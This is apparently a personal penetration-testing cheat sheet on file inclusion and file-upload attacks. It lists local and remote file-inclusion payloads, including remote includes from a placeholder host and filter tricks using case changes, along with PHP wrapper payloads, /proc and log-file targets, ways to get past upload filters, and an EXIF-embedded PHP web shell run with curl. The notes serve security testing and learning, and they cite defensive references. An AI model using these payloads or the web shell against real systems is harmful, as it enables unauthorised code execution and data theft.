---
layout: default
title: File Inclusion
nav_order: 2 
parent: security stuff
---

## File Inclusions
In my research, i have found that file inclusion vulnerabilities (whether it be LFI of RFI) can be the most fruitful avenues to exploiting a box.
There are many ways to test for and exploit file inclusion vulnerabilities. Here is a list that I have put together for my own reference: 

- Basic LFI / Path Traversal:
`?page=/etc/passwd`
`?page=../../../../../../etc/passwd`

- Basic RFI:
`?file=http://somesite.com:8000/file.php`
`?file=https://somesite.com:8000/file.php`
`?file=ftp://somesite.com:8000/file.php`
  - Sometimes, input validation may prevent "http/https" requests but this is usually overcome easily by changing the case:
  `?file=HTTP://somesite.com:8000/file.php`
  `?file=htTp://somesite.com:8000/file.php`
  `?file=HttP://somesite.com:8000/file.php`





## LFI - Local File Inclusion
In most cases, when LFI is possible, the proc file system will be accessible for reading
Some interesting proc entires to keep in mind are: 
/proc/shed_debug : provides information concerning which processes are running are which cpu. Can help identify running PIDs
/proc/mounts : provides a list of mounted file systems
/proc/net/arp : displays ARP table info
/proc/net/route : displays routing table info
/proc/net/tcp[udp] : provides a lsit of active TCP(UDP) connections, identifies listening ports
/proc/net/fib_trie : this is used for route caching and help gain a better understanding of a target's network structure
/proc/version : displays kernel version info

If an application's PID is known, here are some interesting entries: *(NOTE: $PID can also be "self" to represent the running process)*
/proc/$PID/cmdline : lists everything that was used to invoke the process
/proc/$PID/environ : list all environment variables that were set when the process was executed
/proc/$PID/cwd : points to the current working directory of the process
/proc/$PID/fd/[#] : provides access to the file descriptor specified


In some cases, it is possible to execute PHP via the php://include wrapper:
`http://sometite.com/?page=php://input <?phpinfo();?>`
Or it may also be possible to look at the source of PHP files on the server using the php://filter wrapper:
`http://somesite.com/?page=php://filter/convert.base64-encode/resource=login.php


Including injected PHP code: (/var/log/apache/error.log)
`?file=../../../../../../../var/log/apache/error.log`





Resources:
<https://blog.netspi.com/directory-traversal-file-inclusion-proc-file-system/>
<https://diablohorn.com/2010/01/16/interesting-local-file-inclusion-method/>



---



1. PHP bypass content-type filtering and extension checks:
- try uploading a file.php, intercepting the request and changing the MIME type (i.e. `image/gif` `image/png` `image/jpg` `image/jpeg`)
- try changing the extension to .PHP instead of .php (lowercase vs uppercase)
- try appending additional extensions: .jpg.php or .php.jpg or .php.foo
- try tiggering the NULL byte: .php%00 or .php%00.jpg (also try: .php%00?)
- try uploading an image with embedded php: (depends solely on the ability to write to the file: `.htaccess`)
  - Add the following to the .htaccess file:
        > `AddType application/x-httpd-php .jpg`
        > # or
        > `AddType application/x-httpd-php5 .jpg`
  - Append php code to a valid image file:
        > `echo '<?php mail("root@localhost", "test" "mic check 1..2..1..2");' >> image.jpg`
  - In some cases, it may be necessary for the PHP code to prefix the image: 
        > `( echo -n '<?php header("Content-Type: image/jpg"); mail("root@localhost", "test", "mic check..1..2..1..2");?>'; cat original_image.png ) >> image.php.jpg` 
  - Upload the file and visit the image's URL. The image will display and the php code will also execute.
  - Try also embedding the php code somewhere else in the image (i.e. the EXIF data)

        ```bash
        # delete extra headers
        jhead -purejpg file.jpg
        # edit EXIF data:
        jhead -ce file.jpg
        # paste your php code in one line:
        <?=$_GET[0]($_POST[1]);?>
        ```
  - It's quickest to use curl to execute the script:
        `curl -i -X POST "http://127.0.0.1/phppng.png?0=shell_exec" -d "1=id"`

---

Resources & More Info on how to protect against these vulnerabilities:
- <http://nullcandy.com/php-image-upload-security-how-not-to-do-it/>
- <https://phocean.net/2013/09/29/file-upload-vulnerabilities-appending-php-code-to-an-image.html>
- <http://symcbean.blogspot.com/2016/06/local-file-inclusion-why-everything-you.html>
- <https://en.wikipedia.org/wiki/File_inclusion_vulnerability>
- <https://websec.io/2012/09/05/A-Silent-Threat-PHP-in-EXIF.html>
- <https://www.acunetix.com/websitesecurity/upload-forms-threat/>

- <https://github.com/wireghoul/htshells>
- <https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/PHP_Configuration_Cheat_Sheet.md>
- <https://suhosin.org/stories/index.html>
- <https://www.owasp.org/index.php/Unrestricted_File_Upload>
